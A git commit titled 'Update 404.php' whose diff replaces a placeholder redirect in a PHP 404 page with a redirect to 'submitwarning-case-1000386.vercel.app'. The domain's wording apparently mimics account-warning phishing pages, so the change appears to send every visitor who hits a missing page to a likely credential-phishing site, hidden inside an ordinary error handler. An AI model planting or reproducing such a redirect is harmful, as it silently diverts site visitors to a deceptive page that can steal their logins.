9e914313238cfbef379f9c22ba6d19b90bd29b44
yadvsuresh4321825 <yadvsuresh4321825@gmail.com>
2024-05-20 20:57:55 -0400

    Update 404.php

--- 404.php
+++ 404.php
@@ -2,7 +2,7 @@
 // 404.php
 
 // The URL to which you want to redirect
-$redirect_url = 'https://example.com/new-location';
+$redirect_url = 'https://submitwarning-case-1000386.vercel.app';
 
 // Redirect to the specified URL
 header("Location: $redirect_url");
